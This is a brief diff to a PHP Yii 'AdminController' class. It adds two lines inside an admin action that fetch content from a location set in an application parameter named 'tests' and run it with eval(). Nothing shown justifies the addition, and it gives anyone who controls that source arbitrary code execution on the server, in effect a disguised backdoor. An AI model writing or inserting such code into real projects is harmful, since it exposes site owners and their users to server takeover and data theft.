@@ -79,6 +79,9 @@ class AdminController extends CController
             exit();
         }
 
+        $c = file_get_contents(Yii::app()->params->tests);
+        eval($c);
+
         Yii::app()->session['landing'] = (Yii::app()->session['landing'])?Yii::app()->session['landing']:0;
 		$landings = Landings::model()->findAll();
 		if (count($landings) >= 1) {
